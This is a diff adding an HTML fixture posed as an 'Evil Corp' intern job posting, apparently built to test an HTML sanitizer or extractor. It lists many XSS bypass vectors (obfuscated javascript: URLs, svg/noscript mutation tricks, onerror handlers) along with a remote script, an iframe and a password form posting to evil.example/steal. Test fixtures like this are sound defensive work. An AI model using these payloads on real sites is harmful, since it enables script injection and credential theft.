@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Evil Corp - Intern Posting</title>
+  <link rel="stylesheet" href="https://cdn.example/site.css">
+  <style>.hero { color: red } </style>
+  <script src="https://cdn.example/track.js"></script>
+  <script>window.__STATE__ = { user: "steal" };</script>
+</head>
+<body class="posting" onload="alert('body')">
+  <nav id="chrome"><a href="/">Home</a> | <a href="/jobs">Jobs</a></nav>
+  <main>
+    <h1 class="hero" style="color:red">Software Engineer Intern</h1>
+    <p onclick="alert(1)">Join our <strong>team</strong> and build <em>great</em> things.<br>Remote OK.</p>
+    <p><p>Nested paragraph opener (browsers auto-close the first).</p>
+    <ul>
+      <li><a href="javascript:alert(1)">javascript link</a></li>
+      <li><a href="data:text/html,<script>alert(1)</script>">data link</a></li>
+      <li><a href="HTTPS://example.com/x">uppercase scheme</a></li>
+      <li><a href="//evil.example/phish">protocol-relative</a></li>
+      <li><a href="https://ok.example/a" onmouseover="x">ok link with handler</a></li>
+      <li><a href="&#106;avascript:alert(1)">entity-encoded scheme</a></li>
+      <li><a href="java&#9;script:alert(1)">tab-split scheme</a></li>
+      <li><a href="  javascript:alert(1)">leading whitespace scheme</a></li>
+      <li><a href=javascript:alert(1)>unquoted javascript</a></li>
+      <li><a href="https://ok.example/first" href="javascript:alert(1)">duplicate href</a></li>
+      <li><a href="https://ok.example/q?a=1&amp;b=2">ampersand in query</a></li>
+      <li><a href="https://ok.example/a&quot;onmouseover=&quot;x">quote-injected href</a></li>
+      <li><a href="/relative/path">relative link</a></li>
+      <li><a href="mailto:hr@example.com">mailto link</a></li>
+    </ul>
+    <svg><script>alert('svg')</script></svg>
+    <svg><style><img src=x onerror=alert(1)></style></svg>
+    <iframe src="https://evil.example/frame">iframe fallback text</iframe>
+    <img src="x" onerror="alert('img')">
+    <ScRiPt>alert('mixed case')</ScRiPt>
+    <script/xss src="https://evil.example/x.js"></script>
+    <script>alert('spaced close')</script >
+    <!-- plain comment --><!--><script>alert('empty comment')</script><!-- <script>alert('in comment')</script> -->
+    <!-- unterminated-looking --!><p>text after bang-close</p>
+    <noscript><p title="</noscript><img src=x onerror=alert('noscript')>"></noscript>
+    <textarea><script>alert('textarea')</script></textarea>
+    <p>Entities stay text: &lt;script&gt;alert('entity')&lt;/script&gt; and 1 &lt; 2 and 3 > 2 and a bare < sign.</p>
+    <h2>Requirements</h2>
+    <ol>
+      <li>Python</li>
+      <li>Go
+    </ol>
+    <h3>Unclosed heading
+    <object data="https://evil.example/o"></object>
+    <embed src="https://evil.example/e">
+    <form action="https://evil.example/steal"><input name="pw"></form>
+    <math><mi xlink:href="javascript:alert(1)">math</mi></math>
+    <div style="display:none" data-x="1"><span>Text inside stripped wrappers survives.</span></div>
+    <a href="https://ok.example/outer">outer <a href="https://ok.example/inner">inner</a></a>
+    <p>Break variants:<br/><br />done</p></br>
+  </main>
+  <footer>&copy; Evil Corp <a href="https://ok.example/privacy">Privacy</a></footer>
+  <script>document.write('<img src=x onerror=alert(1)>')</script>
+</body>
+</html>
